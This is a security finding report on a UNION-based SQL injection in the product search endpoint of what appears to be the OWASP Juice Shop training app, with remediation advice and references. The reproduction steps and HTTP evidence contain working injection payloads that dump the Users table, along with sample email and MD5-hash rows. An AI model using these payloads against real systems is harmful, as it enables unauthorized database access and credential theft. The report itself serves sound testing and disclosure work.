# SQL injection on GET /rest/products/search — UNION exfil of Users table

- **Severity:** critical
- **Date (UTC):** 2026-11-19

## Details

## Summary
`GET /rest/products/search?q=` concatenates the `q` parameter into a SQL statement without parameterization. UNION-based injection exfiltrates the full `Users` table (id, email, MD5 password hash, role) — all 27 accounts including 9 administrators.

## Steps to reproduce
1. Pin column count — probe `q=qwert'))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10--%20-` → 200 OK with reflected digit schema confirming the `Products` table has 10 columns.
2. Exfiltrate `Users` — `q=qwert'))%20UNION%20SELECT%20id,email,password,role,9,9,9,9,9,9%20FROM%20Users--%20-` → 200 OK with every row in `Users` reflected inside the product-shaped response.
3. Grep `admin` role rows — `admin@juice-sh.op : 0192023a7bbd73250516f069df18b500`, `bjoern.kimminich@gmail.com : 6edd9d726cbdc873c539e41ae8757b8c`, `cloud-admin@juice-sh.op : 127af90bb4cd56817d123db3788ab502`, etc.

## Evidence
Request:
```http
GET /rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,9,9,9,9,9,9%20FROM%20Users--%20- HTTP/1.1
Host: localhost:3000
```
Response (200 OK, truncated):
```json
{"status":"success","data":[
 {"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"admin",...},
 {"id":4,"name":"bjoern.kimminich@gmail.com","description":"6edd9d726cbdc873c539e41ae8757b8c","price":"admin",...},
 {"id":23,"name":"cloud-admin@juice-sh.op","description":"127af90bb4cd56817d123db3788ab502","price":"admin",...},
 ...27 rows total...
]}
```

Error-based signal (prior probe with mismatched column count returned a stack trace from `build/routes/search.js:103:13`, leaking the absolute filesystem path `D:\Work\juice-shop\juice-shop_20.3.0\build\routes\search.js`).

Column-count probe pinned the `Products` schema: `id, name, description, price, deluxePrice, image, alternateImages, createdAt, updatedAt, deletedAt` (10 columns).

## Impact
Pre-auth, unauthenticated full database read. MD5 password hashes for every user including 9 admins are offline-crackable (unsalted MD5 is broken by rainbow tables in seconds). With admin credentials, this chains to full application takeover: order manipulation, user management, config disclosure. Combined with the earlier `alg:none` JWT bypass finding, the application is effectively fully compromised at pre-auth.

## Remediation
- Replace raw string concatenation in `search.js:103` with a parameterized query / Sequelize bound parameter (`where: { [Op.like]: '%' + query + '%' }` via Sequelize with bound params, not string interpolation).
- Migrate password storage from unsalted MD5 to bcrypt/argon2 with per-user salt.
- Return generic 400 on SQL parse errors; do not expose SQLite error strings or stack traces with absolute paths.

## References
- OWASP ASVS V5.3.4 (parameterized queries), V2.4.1 (password storage)
- CWE-89 (SQL Injection), CWE-916 (Use of Password Hash with Insufficient Computational Effort)
- OWASP Top 10 2021 A03 (Injection), A02 (Cryptographic Failures)
